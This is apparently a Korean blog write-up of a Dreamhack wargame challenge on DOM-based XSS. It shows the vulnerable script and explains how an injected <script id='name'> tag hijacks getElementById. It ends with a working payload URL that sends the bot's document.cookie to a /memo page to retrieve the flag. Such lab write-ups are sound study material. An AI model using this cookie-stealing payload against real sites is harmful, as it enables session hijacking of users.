---
slug: "dom-xss"
title: "DOM XSS"
date: 2026-04-27
category: "DH"
section: "wargame"
tags: []
excerpt: "// 사용중인 url :…"
readingTime: 2
---

# DOM XSS
LEVEL 2
~~~javascript
window.addEventListener("load", function() {
    var name_elem = document.getElementById("name");
    name_elem.innerHTML = `${location.hash.slice(1)} is my name !`;
}); 

// 사용중인 url : http://host8.dreamhack.games:17612/vuln?param=%3Cimg%20src=https://dreamhack.io/assets/img/logo.0a8aabe.svg%3E#dreamhack
~~~
**문제점:** 
- url # 에서 받은 해시를 그대로 갖다가 넣어 놓고 쓰고 있음
- getElementById 는 DOM에서 첫 번째로 발견되는 `id="name"` 요소를 반환 `param`에 `<script id="name">` 을 삽입하면 원래 name 요소보다 먼저 발견됨
	→ JS가 가짜 script 태그를 name으로 착각.
	→ 이미 신뢰된 script 태그를 DOM 조작으로 가로챔

**공격 흐름**
~~~
1. 봇이 아래 URL 방문
   /vuln?param=<script id="name"></script>#location.href='/memo?memo='+document.cookie//

2. DOM 구성
   <script id="name"></script>  ← param으로 삽입
   <p id="name">dreamhack</p>   ← 원래 요소

3. getElementById("name") → 가짜 script 태그 반환

4. script.innerHTML =
   "location.href='/memo?memo='+document.cookie// is my name !"
   
5. // 로 "is my name !" 주석처리 → JS 실행

6. 봇의 쿠키(FLAG) 가 /memo 로 전송

7. /memo 접속 → FLAG 확인
~~~

~~~
http://127.0.0.1:8000/vuln?param=<script id="name"></script>#location='/memo?memo='+document.cookie// 
~~~
